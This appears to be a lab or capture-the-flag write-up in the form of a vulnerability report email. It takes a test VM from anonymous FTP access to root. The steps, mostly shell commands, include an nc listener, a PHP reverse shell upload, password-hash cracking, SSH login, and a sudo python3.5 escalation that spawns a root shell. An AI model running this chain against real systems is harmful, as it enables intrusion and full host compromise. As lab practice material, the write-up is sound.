To: security@organization.com


Subject: Security Vulnerability Report: Privilege Escalation in Local#1 VM

Dear Security Team,

I have encountered an vulnerability into your system.  Please see below for more information.

Summary: Anon FTP (port 21) exposes files leading to user pivot (shrek), then sudoers misconfig on /usr/bin/python3.5 enables root escalation.

Impact: External attacker → root shell: full compromise (data exfil, persistence, lateral moves). Pivots to domain in enterprise.

--- 

## Steps to Reproduce:
1. Find your IP: `ifconfig` (note e.g., 192.168.128.1) 
2. Find target: `nmap -sn 192.168.128.0/24 -n` (exclude yours, e.g., 192.168.128.2) 
3. Scan: `sudo nmap -sV -sC -F 192.168.128.2` (confirms FTP anon) 
4. Anon FTP: `ftp 192.168.128.2` → `anonymous` → enter → `get life.c template.html` → `bye` 
5. Check files: `cat life.c template.html` (spot vuln) 
6. Dirsearch: `dirsearch -u http://192.168.128.2` (find /files/)
7. Setup listener (term1): `nc -lvnp 4444`
8. Download/edit php-reverse-shell.php from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), set IP=yourIP:LPORT=4444 
9. Upload/activate (term2): `curl "http://192.168.128.2/files/php-reverse-shell.php"` 
10. Upgrade shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `ls -la /home` 
11. Read hint: `cat /home/important.txt` (hash) → crack online (e.g., hashes.com) → e.g., `password123` 
12. SSH user: `ssh shrek@192.168.128.2` (use cracked pass) 
13. Root: `sudo /usr/bin/python3.5 -c 'import os; os.execl("/bin/sh", "sh", "-p")'` → `whoami` (root) → `cat /root/root.txt` 
<br>

--- 

####  Proof of Root Access:

1. root@ubuntu:# cat /root/root.txt → flag{01Talent@nokOpA3eToFrU8r5sW1dipe2aky}

    [Proof of Access](/01/root01.png)

Happy to demo or advise fixes!

Best regards,<br>
Joon Kim <br>
Pentester <br>
2026-03-22




[← Back to README](../README.md)